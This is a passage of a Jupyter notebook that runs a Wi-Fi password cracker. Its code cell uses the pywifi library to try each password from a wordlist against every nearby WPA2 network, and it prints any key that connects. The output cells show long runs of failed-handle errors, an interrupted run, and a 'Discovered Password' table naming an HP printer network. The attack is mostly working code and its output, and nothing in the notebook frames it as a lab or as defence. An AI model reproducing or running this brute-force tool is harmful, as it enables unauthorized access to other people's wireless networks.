      "pywifi 2024-04-21 19:58:05,341 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:09,854 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:14,374 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:18,913 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:23,428 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:27,957 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:32,507 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:37,045 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:41,568 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:46,093 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:50,616 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:55,132 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:59,649 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:04,164 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:08,678 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:13,204 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:17,727 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:22,255 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:26,855 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:31,375 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:35,889 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:40,400 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:44,924 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:49,437 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:53,960 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:59:58,486 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:03,024 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:07,032 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:11,571 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:16,097 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:20,624 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:25,149 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:29,662 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:34,226 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:38,751 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:43,272 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:47,825 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:52,345 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:00:56,862 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:01,378 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:05,904 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:10,437 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:14,949 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:19,459 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:23,975 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:28,493 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:33,005 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:37,524 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:42,042 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:46,564 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:51,084 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:01:55,609 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:00,156 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:04,700 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:09,221 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:13,747 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:18,259 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:22,769 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:27,302 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:31,310 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:35,825 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:40,354 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:44,870 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:49,390 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:53,911 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:02:58,422 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:02,936 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:07,458 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:11,971 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:16,496 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:21,026 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:25,546 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:30,070 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:34,584 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:39,109 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:43,621 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:48,129 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:52,641 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:03:57,163 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:01,679 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:06,203 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:10,724 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:15,238 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:19,754 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:24,318 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:28,829 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:33,353 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:37,868 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:42,379 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:46,900 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:51,412 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:04:55,926 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:00,448 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:04,965 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:09,491 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:14,030 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:18,549 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:23,073 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:27,600 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:32,152 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:36,679 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:41,188 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:45,707 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:50,221 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:54,744 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:05:59,257 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:03,784 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:08,297 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:12,814 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:17,332 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:21,846 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:26,359 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:30,869 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:35,380 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:39,895 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:44,422 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:48,943 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:53,500 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:06:58,010 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:02,517 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:07,048 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:11,577 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:16,095 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:20,610 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:25,126 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:29,640 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:34,156 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:38,672 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:43,189 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:47,709 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:52,222 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:07:56,748 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:01,260 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:05,782 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:10,296 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:14,822 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:19,328 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:23,847 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:28,366 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:32,881 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:36,889 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:41,422 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:45,942 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:50,462 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:54,990 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:08:59,517 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:04,030 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:08,547 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:13,092 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:17,628 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:22,145 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:26,660 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:31,199 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:35,717 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:40,222 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:44,849 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:49,365 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:53,894 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:09:58,409 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:02,927 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:07,483 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:11,998 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:16,503 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:21,027 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:25,562 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 20:10:30,109 ERROR Open handle failed!\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[30], line 19\u001b[0m\n\u001b[0;32m     16\u001b[0m profile \u001b[38;5;241m=\u001b[39m iface\u001b[38;5;241m.\u001b[39madd_network_profile(profile)\n\u001b[0;32m     18\u001b[0m iface\u001b[38;5;241m.\u001b[39mconnect(profile)\n\u001b[1;32m---> 19\u001b[0m time\u001b[38;5;241m.\u001b[39msleep(\u001b[38;5;241m4\u001b[39m)\n\u001b[0;32m     20\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m iface\u001b[38;5;241m.\u001b[39mstatus() \u001b[38;5;241m==\u001b[39m const\u001b[38;5;241m.\u001b[39mIFACE_CONNECTED:\n\u001b[0;32m     21\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124msuccess password of the network\u001b[39m\u001b[38;5;124m'\u001b[39m,i,\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m is\u001b[39m\u001b[38;5;124m'\u001b[39m,j)\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "try:\n",
    "    for i in available_devices:\n",
    "        profile = pywifi.Profile()\n",
    "        i=i.strip()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "        flag=0\n",
    "        for j in keys:\n",
    "            j=j.strip()\n",
    "            profile.key = j\n",
    "            wifi = pywifi.PyWiFi()\n",
    "            iface = wifi.interfaces()[0]\n",
    "            iface.remove_all_network_profiles()\n",
    "            profile = iface.add_network_profile(profile)\n",
    "\n",
    "            iface.connect(profile)\n",
    "            time.sleep(4)\n",
    "            if iface.status() == const.IFACE_CONNECTED:\n",
    "                print('success password of the network',i,' is',j)\n",
    "                final_output[i] = j\n",
    "                flag=1\n",
    "                break\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "    if flag == 0:\n",
    "        print('sorry we are not able to CRACK PASSWORD of',i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce080d5a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "********** Discovered Password **********\n",
      "HOST NAME          PASSWORD    \n",
      "HP-Print-EC-Photosmart 5520     \n"
     ]
    }
   ],
   "source": [
    "print('*'*10,'Discovered Password','*'*10)\n",
    "print(\"{0:<18} {1:<12}\".format(\"HOST NAME\",\"PASSWORD\"))\n",
    "for SSID,Key in final_output.items():\n",
    "    print (\"{:<19}{:<5}\".format(SSID, Key))\n",
    "available_devices.clear()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "513fa99b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
